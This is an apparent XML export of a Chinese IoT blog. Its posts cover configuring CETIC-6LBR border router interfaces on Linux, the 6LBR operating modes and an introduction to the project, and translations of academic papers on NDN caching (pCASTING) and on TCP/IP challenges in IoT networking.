    <content type="text"><![CDATA[6LBR 系列博文之（二） - 6LBR 接口配置。 注意：本文只与基于Linux的6LBR有关。 在Linux平台上，你需要将6LBR应用程序链接到你的LAN网络，为此，你有三种可能性。（为了使清晰起见，您可以假设6LBR是在Linux主机上运行的VM） 以太网直连 这是最简单的方法，但也是最有限的一种，您的Linux主机将无法直接与6LBR和WSN通信。如名称所示，6LBR直接使用配置的以太网接口发送和接收数据包。 你需要在你的 /etc/6lbr/6lbr.conf 文件中进行如下配置（我们假设你的以太网接口是eth0）： 123RAW_ETH=1BRIDGE=0DEV_ETH=eth0 桥接模式 此模式需要更多配置，但是你将能够与Linux主机的6LBR通信。在这种模式下，6LBR将创建一个虚拟以太网接口，通常为tap0。您需要将其桥接到以太网接口，以提供连接。创建的桥接接口将替换您的以太网接口用于所有目标。 重要的提示：你的以太网驱动程序必须支持混杂模式，如果不能，桥将无法正常工作，你将与6LBR间歇性连接。 Beaglebone的以太网驱动程序不支持混杂模式！ 你需要在你的 /etc/6lbr/6lbr.conf 文件中进行如下配置（我们假设你的以太网接口是eth0）： 123456RAW_ETH=0BRIDGE=1CREATE_BRIDGE=0DEV_ETH=eth0DEV_BRIDGE=br0DEV_TAP=tap0 你还需要创建一个桥接接口br0，在 /etc/6lbr 目录下，我们提供了两个/etc/network/interfaces 文件的例子。例如，如果你使用DHCP，文件的内容应该是： 12345678910111213...iface eth0 inet staticaddress 0.0.0.0auto br0iface br0 inet dhcp bridge_ports eth0 bridge_stp off up echo 0 &gt; /sys/devices/virtual/net/br0/bridge/multicast_snooping post-up ip link set br0 address `ip link show eth0 | grep ether | awk &apos;&#123;print $2&#125;&apos;`... 如你所见，以太网接口不再配置，它已被br0替换。 可以在6LBR启动时创建网桥，但是这样做的结果是，当以太网接口加入网桥时，你将丢失所有现有连接。如果你真的想要这种模式，你必须添加到你的6lbr.conf文件： 1CREATE_BRIDGE=1 路由模式 这种模式是最强大的，也是最复杂的。您不需要创建连接tap0接口和et0接口的网桥，而是依靠Linux主机栈来在两个接口之间进行路由，在IP级使用实际路由或以太网级使用ebtables。这只有在有多个接口或复杂路由时，或者当您的以太网驱动程序不支持混杂模式时才有用。 6lbr.conf 文件的配置很简单： 1234RAW_ETH=0BRIDGE=0DEV_ETH=eth0DEV_TAP=tap0 可以通过在/etc/sysctl.conf中添加以下两行来启用IP转发： 12net.ipv4.ip_forward = 1net.ipv6.conf.all.forwarding=1 为了避免在tap0和eth0接口之间有一个不必要的子网，最好使用没有前缀自动配置的SmartBridge模式。 遇到的问题 使用桥接模式时，树莓派ip地址经常跳变，解决办法： 当接口添加到网桥时，其所有配置都将丢失。因此，当6LBR启动并将以太网接口添加到其网桥时，连接将丢失。解决方案是在系统引导时使用提供的接口示例文件（在/etc/6lbr/interfaces.*.example中）创建桥接，并在/etc/6lbr/6lbr.conf中设置CREATE_BRIDGE = 0。]]></content>
      <categories>
        <category>IoT</category>
        <category>6LoWPAN</category>
      </categories>
      <tags>
        <tag>［IoT,6LBR,6LoWPAN］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]Caching in Named Data Networking for the Wireless Internet of Things]]></title>
    <url>%2F2017%2F03%2F18%2F%E8%AF%91-Caching-in-Named-Data-Networking-for-the-Wireless-Internet-of-Things%2F</url>
    <content type="text"><![CDATA[NDN的缓存策略在有线网络中表现了较高的性能，相对于目前的TCO/IP体系结构具有较大的优势，但是，一方面，IoT系统是一个资源受限设备的环境，NDN在有线网络的缓存策略并不适合IoT环境，另一方面，与有线网络不同的是IoT中Consumer的数量往往小于Producer的数量，因此需要设计额外的缓存策略。本论文提出了一种新的缓存策略，并进行了模拟实验进行验证，对于NDN-IoT中的缓存策略是一个很好的促进，论文的思路也是值得借鉴的。 12345678910Caching in Named Data Networking for the Wireless Internet of Things将命名数据网络中的缓存运用于无线物联网Mohamed Ahmed Hail *, Marica Amadeo t , Antonella Molinaro t , Stefan Fischer**Telematics Institute University of LUbeck, Germany, E-mail: &#123;hail.fischer&#125;@itm.uni-luebeck.det University Mediterranea of Reggio Calabria, Italy, E-mail: name.surname@unirc.it 摘要： 命名数据网络是一个有前景的信息中心未来网络体系结构。除了它作为内容获取方案在有线领域被认为是有潜力的之外，NDN最近被认为是一种可以用于物联网的技术，由于其创新特征，比如基于名字的路由和网络内缓存。特别地，在中间节点缓存可能特别有用，以减少获取延迟，限制网络流量和减轻数据生产者的负载。然而，不像传统的因特网内容，物联网数据是不断变化的，并被生产者周期性地更新。同时，不像因特网路由器，物联网设备可能是资源限制的，在能源，存储和处理能力方面的受限。因此，为非瞬变的因特网流量和因特网路由器设计的缓存算法不能很好地适应IoT领域。 在本文中，我们考虑无线NDN-IoT网络，并提出了一种新的分布式概率性缓存策略，依赖于数据的新鲜度和设备的潜在受限能力（能量层次和存储能力）。提出的方案通过在ndnSIM上的模拟实验评估，结果显示在数据获取和网络能源效率方面，它比传统的NDN缓存机制做的更好。 关键词： 命名数据网络；信息中心网络；物联网；网络内存储；新鲜度 引言 在物联网愿景中，异构的无线设备，范围从小的、受限的传感器和执行器到更强大的智能手机和车联网，将与物理周围环境交互，并且通过因特网来支持大范围的环境感知服务。相较于传统的因特网主机，比如路由器，PC和笔记本电脑，绝大多数IoT设备在能源、内存和计算能力方面受到限制，并且他们具有移动性。此外，不像以大的、时不变文件为特征的因特网内容不同，IoT数据通常是小且临时的。新信息可能不断生成，例如，传感器定期更新环境数据，并且应用程序对最新的数据包感兴趣。 由于IoT系统这样明显的特色，研究社区正在设计新的网络协议使其有效支持IoT通信。除了基于IP的解决方案和基于云的方法，信息中心网络模式最近也已经考虑用于IoT。事实上，这种革命性的体系结构的潜力是多方面的，正如IRTF的ICNRG所观察的和最近的文献展示的那样。在ICN中，每个内容包使用一个唯一的，持续的，位置独立的名字来命名，并且由网络节点视为一个自我识别、自我认证的数据单元。该内容是由消费者直接使用内容的名称来获取，而不需要生产者的IP地址。这个模式从基于IP的主机中心模型转变到信息中心模型，意味着几个好处，包括更简单的数据获取和分享，本地移动性支持，网络内部缓存和基于内容的安全，这些在IoT中特别有用。特别地，网络内部缓存可以加速数据获取并且减少网络内的流量，因为数据请求可以通过临近消费者的中间节点被满足。这也意味着网络内缓存限制了对生产者的大量数据访问，并且通过放松连续连接的需要将后者和接收者解耦。 尽管网络内部缓存已经在ICN有线网络中被广泛地研究，因为信息新鲜度和资源受限设备存在严格要求，为因特网设计的传统缓存算法不太适合于loT。只有一些初步工作[6]-[8]考虑了IoT系统中的缓存，但是没有为无线环境提出一个特定的缓存策略。 为了弥补这一不足，在本文中，我们专注于设计一个新的专门针对无线多跳信息中心IoT系统的缓存策略。在几个ICN实例中，我们参考命名数据网络体系结构（NDN），它利用简单但是健壮的兴趣包和数据包分别用于请求和传送命名内容单元。NDN对于不同的缓存算法实现是开放的，例如，节点能够基于用户定义的策略/算法缓存进来的数据包。 在这样的背景下，我们定义pCASTING（a probabilistic CAching STrategy for the INternet of thinGs），一个物联网的概率缓存策略，它考虑数据新鲜度和两个设备特征，即能量层级和存储能力，来动态调整每个节点的缓存概率。这个提出的策略是完全分布式的，不需要任何额外的信号传输。通过ndnSIM进行模拟实验的结果表明，相较于在NDN中广泛使用的参考缓存方案，pCASTING通过保证更低的数据获取延迟增加了网络的能量效率，这些参考缓存方案包括通用缓存方案和随机缓存方案。 本文的其余部分组织如下。第2部分介绍了NDN体系结构和NDN-IoT系统中的缓存的相关工作。第3部分提出了pCASTING提议，第4部分讨论了性能评估。最后，第5部分总结全文。 背景和动机命名数据网络 NDN作为一个未来互联网的内容传播体系结构被提出，它采用分层的类似URI的内容名称，在兴趣包和数据包中被携带。每个NDN节点维持三张表：（i）内容存储（CS），用来缓存进来的数据包；（ii）待定兴趣表（PIT），用来记录已经转发的但还未被满足的兴趣包；（iii）转发信息表（FIB），用作基于内容名字的路由。当节点收到一个兴趣包，它首先在CS中查找，如果找到匹配，则节点将返回数据包。否则，如果在PIT表中有匹配条目，兴趣包被丢弃，因为一个相同的请求已经被转发。否则，创建一个新的PIT条目并且进一步转发到存储在FIB表的接口。数据包遵循PIT表条目的链条返回到消费者，并且它可以被缓存在中间节点。 节点的缓存系统包含（i）缓存决策策略，指定是否缓存一个输入的数据包；（ii）替代策略，指定当一个新的输入数据包需要被缓存并且CS满了的时候哪个元素必须被删除。NDN中默认的缓存策略也叫做在任何地点缓存任何东西方案（$ CE^2 $），节点缓存每个进来的数据，而替换是按照标准策略执行，例如最近最少使用策略（LRU）。然而，许多的论文已经指出通用缓存策略的低效率，例如，在文献[11]中，由于高度的内容冗余和可用缓存资源的低效利用。这是在这篇论文中经常使用其他解决方案的原因，包括概率缓存。概率性缓存背后的关键想法是一个NDN节点随机的缓存进来的数据包通过一个确定的概论p，其中0&lt;p&lt;1。$ CE^2 $策略是概率性方案的特殊情况，其中，p=1。减小p降低了网络内部缓存的可能性并且最大化网络内数据缓存的多样化。 正如文献[6]中讨论的，NDN可能在IoT中很有效并且它可以工作在链路层之上而不需要一个在IP堆栈上的覆盖网络，这意味着额外的内存开销。最近的工作已经开始将NDN作为一个从零开始的方法应用在不同的IoT场景，包括建筑管理系统和智能运输系统，聚焦于命名，安全和转发方面。 NDN-IoT系统的缓存 到目前为止，已经提出了大量的NDN网络缓存策略，但他们没有专门讨论针对IoT系统和其特征的策略。这些策略通常被设计用于预先录制的多媒体文件，如Youtube视频，和类似的互联网用户频繁请求的大内容；并且他们通常考虑固定和有线路由器连接的内容。值得注意，这种方案更高的性能通常以大开销和复杂度为代价[ 12 ]，这使他们不适合在资源存在约束（移动）设备。 当我们特别关注IoT，NDN网络内缓存问题还基本未被探索。 文献[6]的工作在与实物大小相同的IoT部署中实现了NDN的第一个实验研究。作者通过比较不同消费者在标准NDN内网缓存和禁用缓存时的内容获取性能来评估缓存的影响。结果表明，得益于缓存，无线传输的数量大大减少。实际上，虽然资源约束节点的缓存大小最多是1KB数量级，并且信息是短暂的，缓存仍然是有效的：它增加了内容的可用性，并减少了朝向生产者的有损多跳无线路径的数量。此外，在一方面，IoT设备的缓存小，另一方面，IoT内容的通常也是小的，因此一个单一的缓存可以存储多个IoT包。 在[7]中分析了IoT信息新鲜度对NDN缓存的影响。除了数据包中包含新鲜度参数之外，这确定了多少秒的内容在CS中可以被视为有效的，作者提出了一个消费者驱动的新鲜度方法。该机制允许消费者依据兴趣包中的新鲜度指定其特殊要求，因此CS可以决定它是否有可用信息。结果，作者证明消费者接收到的数据的准确性得到提高。 第一个研究在Internet内容路由器中缓存IoT内容是文献[8]。它提出了一种分布式概率缓存算法，路由器通过考虑他们到源和消费者的跳距离，数据新鲜度，传入请求的速率和新鲜度要求来动态地更新他们的缓存概率。两个关键的概念是提议的理由。第一，当缓存位置远离生产者时，IoT数据变得不那么新鲜，也就是，缓存位置越接近源，获取的数据包就越新鲜。第二，获取数据的位置更接近源而不是消费者会在网络上导致更高的多跳流量负载。因此，该算法定义了一个实用的函数来解决在（i）消费者和生产者的多跳传递（ii）交付数据的数据新鲜度的预期损失之间的权衡。 不像文献[8]，它针对有线互联网和电力的静态设备。我们考虑了由（移动）资源约束节点组成的IoT多跳无线网络和部署轻量级缓存决策算法，像在下一节中讨论的那样。 缓存决策策略假设 在我们的方案中，N个具有有限电池能量的资源受限节点连接在在一个多跳无线网络中。节点可以固定。监测传感器部署在街道，桥梁，建筑物，或移动设备，例如人们携带的智能手机。我们假设一组节点$C = {I,..,Nc},Nc&lt;N$，作为消费者，生产者P产生大量具有特定新鲜度的IoT内容。其余的节点可以充当转发者，缓存传入的数据包。 正如文献[7]中讨论的，消费者通过广播指定了新鲜度要求的兴趣包包来请求数据包包，这是存在IoT瞬时内容的基础。接收到请求并且在其CS没有合适数据的任何节点（与P不同）可以根据已经实现的路由协议重新广播包。 当节点接收到一个与PIT条目匹配的数据包，它利用pCASTING缓存策略执行缓存决策。 作为提出的解决方案的基本要求，我们的目标是简单和无额外开销。pCASTING可以在资源受限的设备中实现是足够简单的，并且它不需要在Interest/Data包中捎带额外的信令或更多的信息。此外，pCASTING完全独立于选定的路由协议：它可以在基于洪泛，生产者感知或路径感知方法的存在下工作。 缓存决策是完全分布式的，包括由每个转发节点本地计算的两个主要步骤： （1）缓存概率的计算，考虑到与设备和内容相关的动态IoT属性。选定的属性进行适当的规范化，使异构的值能够互相比较。 （2）实际概率决策，其基于所计算的概率指定是否缓存数据。 属性描述 作为设备属性，我们考虑两个主要参数：能量级别和缓存占有率，值可以很容易地通过IoT设备监控。 能耗是IoT设备的主要限制因素之一。如果剩余的电池寿命低于预先确定的水平，设备的活动应大力限制。这就意味着缓存（和随之而来的传输）操作应该被尽可能抑制。因此，我们假定缓存概率与剩余电池的能量水平成正比，可以动态地表示为归一化参数$EN,0\le EN \leq1$，值为0和1分别表示着电池完全放电或充满电的。 关于缓存占有率，这是合理的假设，具有高存储容量的节点更倾向于缓存传入的数据，而存储空间有限的节点的缓存决策应具有强烈的选择性。直观的，一个节点的缓存概率应该与缓存占用水平成反比，这可以被描绘成标准化参数$OC,0\le OC\le1$，值0和1分别意味着缓存是空的或者满的。 内容属性，我们考虑的数据剩余的新鲜度。根据NDN，任何生产者可能在数据包中包括一个以秒为单位的新鲜度的值，和一个标识信息产生时刻的时间戳 ts 。 尽管节点自动丢弃CS中的每个过期的数据包，相同数据包的更新鲜的和不新鲜的版本可以在网络中共存，并且消费者应用程序有兴趣获取不同新鲜度需求的相同数据包。例如，消费者C1可以以最多30分钟的新鲜度获得一个路段污染的值，同时，另一个消费者C2可以获取同样的数据包，但是以最多10分钟的新鲜度。接收两个兴趣包的节点可以提供具有数据的缓存副本给第一请求，但是转发第二请求，因为所拥有的数据对于C2来说不够新鲜。这也意味着，在一定时期内，两个版本的具有不同的新鲜度值的相同数据将在网络中可用。 更新鲜的数据包在缓存决策中应该有更高的优先级，因为他们更可能适应消费者的新鲜度要求。因此，我们定义数据包的未归一化剩余新鲜度FR为： $$ FR = 1 - \frac{currentTime-t_s}{f} $$ 根据公式（1），如果时间戳ts与当前时间相等，那么FR=1，数据包被认为是最近生成的，然而，当当前时间增加，剩余的新鲜度降低。当然，有负FR值得包是过期的并且根本不会被缓存。 缓存概率 为了正确定义数据包的缓存概率，我们考虑一个缓存效用函数Fu，它同时考虑到上述归一化参数，EN，OC，FR，该函数可以写作如下： $$F_u = \sum_{i=1}^{N_p} w(i)g(x_i)=0$$ 其中，$ N_p = 3^1 $，权重 $ w_i $是这样一个值，$0\le w_i\le1$，并且$ \sum_{i=1}^{N} w_i = 1$。因此，权重表达了标准化参数xi在计算效用值时的重要性。 Fu 必须在[0：1]之间取值，并且作为节点缓存概率的函数：如果Fu 趋向于1则包缓存的概率高，反之亦然，如果Fu 趋近于0则包缓存的概率低。 函数$ g(x_i) $的模型通过考虑它应该满足的需求来设计。第一，它应该提供一个介于0和1之间的值，并且，当Xi值随着整个缓存的效用成正比例（反比例）时，必须增加（减少）单调。第二，它也应该满足参数XI越接近极限值，对效用将产生更高影响的条件。通过这样来做，缓存决策偏爱更新鲜的内容，它更可能存储在具有较高能量和主要缓存能力的节点。 满足这种性质的数学函数是幂函数,$ g(x_i) = x_i^n, n \ge 1 $，依据第二需求的相关性进行选择。因此，效用函数通过幂函数的加权和来表达。 $$ F_u = w_1 * EN^n + w_2 * (1 - OC)^n + w_3 * FR^n $$ 在数据包的接收时，任何节点计算赋的值，以获得该数据的缓存概率。 实验模拟设置 为了评估提出的 pCASTING 解决方案的性能，我们考虑了一个智慧城市的场景，如图1，代表一个大小为600平米的城市区域。 一组传感器被部署在这个城市来周期性地产生环境数据和其他位置相关信息。采集点获取这些内容，并且通过它们来为用户创造情境感知服务，例如，实时公共交通更新，空气污染更新。接入点（AP）被放置在方形拓扑右上角，为感兴趣的消费者提供这样的情境感知服务。我们假定60个节点在场景中以行人速度移动，根据 Truncated Levy-Walk 移动模型生成现实的人类移动轨迹。这样的移动节点模仿想要访问AP服务的用户所携带的智能手机。每个节点需要配备 IEEE 802.11g 无线接口，其中的介质访问控制和物理参数（例如，传输能力和接收机灵敏度）按目前市场上的设备数据表来配置。传播服从瑞利衰落分布，由于各种障碍，建筑物和树木，需要考虑多径效应。 拓扑中的一个节点子集被选择订阅由 AP 提供的情境感知服务。每个服务作为一组 Nd 数据包被建模，也就是说，每个消费者必须传播不同的利益来获取整体信息。然而，因为信息是瞬变的，每个消费者必须周期性地发送新的兴趣包来获得最新的信息。在我们的场景中，更新周期是1分钟（例如，用户在T =0s，T = 60s，t＝120s等请求内容），并且每次兴趣包携带新鲜度要求，该新鲜度在[1：10]秒随机生成。以多跳方式执行与AP的通信。不失一般性，我们参考的转发协议是可控的洪泛，正如文献[15]定义的，文献[6]特别指无线网络。它包括一个基于计数器的广播方案，为了限制在无线共享介质上的碰撞概率和冗余而推迟分组转发。可控的洪泛在IoT中可能是一个好的选择因为它的固有的简单性：它不依赖额外的控制流量和在节点只需要最少的状态。此外，在一个中等或者小型的拓扑（正如本文考虑的拓扑）潜在的开销由于冗余传输将会降低。 为了研究在高存储限制条件下缓存策略的行为，我们假定每个节点的CS的存储能力被限制到只有10个分组。 我们描述的场景和 pCASTING 解决方案在 ndnSIM 工具中实现，它是NDN研究社区的参考模拟平台被部署在 ns-3 上。仿真的设置在表1中汇总。在下面，我们考虑了两个不同的实验，目的是评估建议的解决方案的能源效率和数据获取性能。 网络生存周期分析 我们评估的第一个目标是理解是否 pCASITNG 是一个高能效的解决方案，在电池供电的情况下保证在检索延迟和收集的数据的数量上好的表现。因此，能源模型在 ns-3 中被用来计算在仿真场景中无线设备的能源消耗。这个模型允许指定每个设备的初始能源并且在仿真期间它基于节点的活动降低了这个值。 在实验中，八个节点被选择作为消费者并提供一个高水平的初始能源，然而，转发节点被提供一个非常低水平的初始能源，并且他们意味着能源很快被耗尽。事实上，我们主要关注的是通过考虑转发节点的能源消耗来估计整个网络的生存时间，它允许消费者和 AP 之间的通信。后者提供了四个不同的上下文感知服务：每个消费者随机选择一个服务并开始以选择的时间间隔请求数据，在[0：5]秒范围内。然后，在每一分钟，每个消费者再次发送兴趣包。当所有的转发节点耗尽他们的能源仿真结束。 我们将 pCASTING 与三个参考方案进行比较：（1）在任何地点缓存任何东西的策略，CE2 ，它缓存每个进来的数据包；（ii）概率方案，P(0.5)，它以固定概率p=0.5缓存进来的数据包；（iii）无缓存方案，节点不使用CS，仅转发进来的数据包。每个缓存方案的替换策略都是LRU。 能源性能度量我们考虑转发节点的放电时间的累积分布函数，它从网络的角度给出了缓存策略的能量效率的信息。作为传播绩效性能，我们考虑在网络生成周期内的缓存命中率，消费者接收到的数据包的平均数目和平均数据获取延迟，计算兴趣包被发送和通信数据包被接收到的时间间隔。延迟考虑兴趣包重发的可能。 结果在10个独立运行的进程上计算。 图2显示了转发节点放电时间的累积分布函数（CDF），表2显示所考虑的数据分发性能的度量值。我们可以观察到，最短的网络生存周期通过$ CE^2 $方案获得：在t = 320s 的时刻，CDF的值达到了1，这意味着所有的转发节点耗尽了所有的能量。这是因为$ CE^2 $策略在节点中产生大量的缓存/转发操作，并且同时它不能最大限度地提高内容的多样性。实际上，在无线领域，许多邻居节点应该同时接收相同的数据包，由于，$ CE^2 $方案的结果，他们都缓存相同的信息。对于小的CS，情况更加严重，这导致高驱逐率，并创建一个随着时间推移的高度均匀的内容分布。这种同质缓存内容的存在有双重副作用。一方面，请求不同的内容将不能通过任何中间节点被满足，兴趣包必须被转发到原始生产者（看表2中的$ CE^2 $的缓存命中率）。另一方面，由于CS匹配的存在，许多节点可以回答相同的请求，但是被白白浪费能源和网络资源。值得注意的是，数据包通常是较长的，然后利益，因此，信道错误或碰撞的数据丢失的概率是较高的利息损失。 没有缓存的方案能够提供一个略高于$ CE^2 $的网络生存周期，但是相应地它有更高的端到端延迟，因为缓存的好处不能以任何方式被利用。 使用P(0.5)方案可以获得更好的表现，通过引入概率缓存决策增加网络内容多样性和促进中间节点的缓存命中。然而，由于他的能源感知行为，pCASTING 保证了最高的网络生存期周期，进而获得最多的数据包。此外，由于固有的概率决策，pCASTING 最大化网络中的内容多样化因此增加了缓存的命中率，因此，减小了数据获取的延迟。 C. 获取性能分析 第二个实验研究完全充电节点的数据分发性能。Ns-3 能量模型仍然被用来显示仿真期间的能量消耗，持续10分钟。在这段时期，可变数量的消费者从1到6周期地请求上下文感知服务。模拟结果平均运行在10个独立的进程上，拥有95%的置信区间。 我们将 pCASTING 与无缓存和P(0.5)方案进行对比。从网络的角度评价缓存策略的效率，我们考虑在仿真期间网络上传输的兴趣包的数量和数据包的数量。反之，为了从消费者的角度评价缓存策略的效率，我们计算消费者的能源成本，它是消费者和正确接收的比特所消耗的能量之间的比率，对所有的消费者来说都是平均值。 图3(a)和3(b)中分别表示兴趣包和数据包的数量，这表明相对于其他的方案 pCASTING 极大地减少了流量，因此节约了网络资源。而且由于它减少了能量消耗。，如图3(c)所示，消费者也能从中获得好处。这是由于获知节点状态（根据能量和缓存大小）和数据包的剩余新鲜度的事实。pCASTING执行智能缓存决策在网络内高效地分发内容。进而，pCASTING 的缓存命中率比不可知的概率方案P(0.5)更高，维持在55%-62%的数量级，P(0.5)方案的缓存命中率通常在50%以下。 结论 在本文中，我们研究了命名数据无线IoT网络的网络内部缓存并且提出了一种分布式叫做pCASTING的缓存方案，它考虑三个主要参数调整缓存概率：电池的能量水平和节点的缓存占用率，以及数据包的剩余新鲜度。模拟结果证明了所提出的解决方案的有效性和效率，这能够减少节点的能量消耗，同时，保证低的内容获取延迟。 我们在pCASTING中计算缓存概率的方法非常多功能的：缓存实用功能Fu可以工作在不同的路由协议并且它可以很简单的通过添加其它参数修改。实际上，作为未来的工作，我们计划（i）包括缓存决定中包括其他属性，（ii）评估缓存和不同路由协议之间可能的相互作用。]]></content>
      <categories>
        <category>论文研读</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>NDN</tag>
        <tag>Cache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6LoWPAN Border Router：6LBR之运行模式]]></title>
    <url>%2F2017%2F03%2F16%2F6LoWPAN-Border-Router%EF%BC%9A6LBR%E4%B9%8B%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[6LBR 系列博文之（一） - 6LBR 运行模式。 概述 6LBR可以在三种类别的模式中运行：网桥，路由器和透明网桥。这三个类别又被细分为以下模式： Bridge SmartBridge Router Router NDP-Router 6LR RPL-Root Transparent Bridge RPL-Replay FullTransparentBridge 网桥 在网桥模式中，只是实现了 802.15.4 接口和以太网接口的桥接，即根据链路层的地址进行网络数据包的转发。在网桥模式中，6LBR 又可分为智能网桥模式和透明网桥模式。 路由器 路由器模式能够实现 IPv6 网络和 6LoWPAN 网络之间真正的路由功能，它将无线传感器网络当作一个独立的子网，因此以太网和无线网的 IPv6 地址前缀不相同，以 6LBR 作为根节点的 RPL 实例管理整个无线传感器网络。 模式的详细介绍智能网桥模式 在这种模式下，6LBR充当智能桥，允许将标准的基于IPv6的网络与基于RPL的WSN Mesh网格互连。智能网桥在以太网端充当NDP代理并且使用NDP参数配置WSN Mesh网络。源和目地MAC地址被转换，系统能够解析数据包的源 MAC 地址和目的 MAC 地址，ICMPv6 包所包含的地址也会被解析出来。智能网桥模式允许你： 将WSN Mesh网络无缝集成到现有的基于NDP的IPv6网络中，智能网桥将使用NDP提供的配置来相应地设置WSN网格。 将多个WSN Mesh网络与自己DODAG聚合到一个虚拟的IPv6子网。支持节点移动性，在两个WSN重叠的情况下，如果一个节点获得更好的链路，它可以从一个WSN切换到另一个，如从虚拟IPv6子网看到的，由于NDP代理，该交换机将几乎不可见。 路由模式 在这种模式下，6LBR作为一个完全成熟的IPv6路由器，互连两个IPv6子网。WSN子网由RPL协议管理，以太网子网由IPv6 NDP管理。在这种模式下，6LBR通过包过滤器模块为Contiki提供了一个虚拟的第二接口。此模式更像是以太网和6Lowpan RPL之间的网关。来自RPL侧的传出报文的源地址将更新为eth_ip_local_addr。 在路由模式你可以： 将WSN网格隔离到其自己的子网中，因此可以清楚地标识WSN节点。 … 注意：前缀切换能力支持跨不同WSN子网的节点移动性，在这种情况下，节点将根据新WSN的前缀获得新地址。 透明网桥模式 在这些模式下，6LBR充当独立网桥，提供基本的交换功能。所有在以太网接口上定位到802.15.4接口的传入包或者传入的组播包被转发到WSN段。相反的，所有针对以太网接口的传入数据包或802.15.4接口上的传入组播数据包都将转发到以太网段。6LBR有自己的地址并作为主机。源和目标MAC地址被转换，ICMPv6数据包中存在的地址也被转换。 在透明桥接模式下你可以： 聚合子WSN网格合并为一个全局DODAG，由外部RPL根节点管理（使用RPL中继时）。 使用NDP桥接一个IPv6网络的一跳网格（当使用FullTransparentBridge时）。 使用IPv6网络桥接静态路由网格（使用FullTransparentBridge时）。 … 注意，我们故意省略标记控制流量的类型，因为RPL和NDP都在可能的用例中提及。 其他模式 以下三种模式在6lbr的官方文档中也未做出说明，有待进一步的工作。 NDP-Router RPL-Root 6LR 本文翻译自 6LBR 官方文档：https://github.com/cetic/6lbr/wiki/6LBR-Modes，向优秀的 CETIC-6LBR 项目致敬！]]></content>
      <categories>
        <category>IoT</category>
        <category>6LoWPAN</category>
      </categories>
      <tags>
        <tag>［IoT,6LBR,6LoWPAN］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6LoWPAN Border Router：CETIC-6LBR介绍]]></title>
    <url>%2F2017%2F03%2F12%2F6LoWPAN-Border-Router%EF%BC%9ACETIC-6LBR%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[CETIC-6LBR 是目前国际上较为优秀的基于 Contiki 系统的 6LoWPAN 边界路由器解决方案。和现有的其他边界路由器方案相比，6LBR 是唯一一个不需要 Linux 主机的独立边界路由器，并且能够提供IPv6/NDP 和 RPL 之间的智能互联。 6LBR简介 6LBR 的目标是连接基于 802.15.4 和 6LoWPAN 的无线传感器网络和基于以太网的现有 IPv6 有线网络。这种连接可以在网络协议栈的多个层面上实现，首先可以在数据链路层（第二层）实现，此时 6LBR 可看作成通常所说的网桥或交换机设备；其次，也可以在网络层（第三层）实现，此时 6LBR 可看作成通常所说的路由器；最后，还可以自应用层（第七层）实现，此时 6LBR 可看作成通常所说的网关设备。 6LBR 方案是在 Contiki 系统之上模拟出第二个接口，不需要对 uIP 协议栈进行大量修改，当 Contiki 系统升级时，6LBR 可以直接替换系统文件实现立即升级。而且它还实现了基于 RPL的多跳网络管理，是目前边界路由器方案中功能最强大的。 6LBR搭建好之后就像我们平常使用的路由器那样会有一个Web界面，可以用来配置我们的边界路由器以及管理我们的6LoWPAN无线传感网络，功能十分强大。 项目地址： https://github.com/cetic/6lbr 下载地址： https://github.com/cetic/6lbr/wiki/Releases 支持的硬件平台 OpenMote Zolertia Ethernet IoT Gateway The Redwire IO The Redwire Econotag TI CC2538DK TI CC2650DK Linux hosts RaspberryPi BeagleBone 开发教程 本人目前正在研究6LoWPAN，将6oWPAN无线传感网络接入Internet需要实现边界路由器，而6LBR正好是一个不错的边界路由器方案，所以我采用CETIC-6LBR在Raspberry Pi上实现了边界路由器功能。目前，国内关于6LBR的资料实在是比较稀缺，特别是对于英语不太好的人来说，遇到问题也比较难找到参考资料，接下来我将会写系列博客介绍6LBR以及如何使用6LBR搭建边界路由器，也欢迎喜欢的小伙伴多多交流！ 在此立下Flag，希望这个系列能够好好写下去！]]></content>
      <categories>
        <category>IoT</category>
        <category>6LoWPAN</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>6LBR</tag>
        <tag>6LoWPAN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]Challenge in IoT Networking via TCP-IP Architecture]]></title>
    <url>%2F2017%2F03%2F08%2F%E8%AF%91-Challenge-in-IoT-Networking-via-TCP-IP-Architecture%2F</url>
    <content type="text"><![CDATA[TCP/IP体系结构下物联网络存在的挑战。 123456789101112131415Challenge in IoT Networking via TCP-IP Architecture TCP/IP体系结构下物联网络存在的挑战 Wentao Shang Yingdi Yu UCLA UCLA Los Angeles, CA Los Angeles, CAwentao@cs.ucla.edu yingdi@cs.ucla.edu Ralph Droms Lixia Zhang Cisco Systems UCLA Cambridge, MA Los Angeles, CArdroms@cisco.com lixia@cs.ucla.edu 摘要：物联网将大量的资源限制设备连接起来，近年来正在变得越来越受欢迎。现在的物联网系统很大程度上基于TCP/IP协议(特别是IPv6)。然而，到目前为止的观察表明最初设计的TCP/IP协议栈并不能很好的适合物联网环境。在过去的几年里，国际互联网工程任务组花了大量的精力在修改协议以使它适合物联网部署方案。这些努力引起对在TCP/IP体系结构中已存在协议的扩展，此外还有多种新协议的开发。然而新的问题持续出现。在本文中，我们分析了TCP/IP应用于物联网环境的挑战并且评论了IETF提出的多种解决方案。我们已经存在的基于IP的解决方案在支持物联网应用上是不高效或不足的，因此，一个更有效地解决方案或许存在于信息中心网络体系架构中。 关键字：物联网;TCP/IP;网络体系结构 概述 物联网通常是指不同种类的计算设备互联来支持各种监控和控制应用。为了兼容来自于不同供应商的设备和应用程序的异构性，现代的物联网系统采用了几十年前为全球有线网络而开发的TCP/IP协议套件标准作为网络解决方案。然而，物联网网络与传统的有线计算机网络在下文详细阐述的基本方面有所不同。这些不同使得将TCP/IP技术应用于IoT环境造成巨大的挑战，并且应对这些挑战将会对网络体系结构造成深远的影响。这篇文章目标是系统地认识IoT环境下形成的挑战，并且阐明应对这些挑战的未来方向。 物联网网络通常包含大量的廉价的、资源受限的设备。这些设备的设计绝大多数受低的制造和运营成本的驱动。因此，IoT设备通常配备有限的计算能力并且需要电池能够支持长时间的操作（比如一年）。由于电力的限制，IoT网络通常采用低能耗二层技术，比如IEEE 802.15.4、蓝牙LE 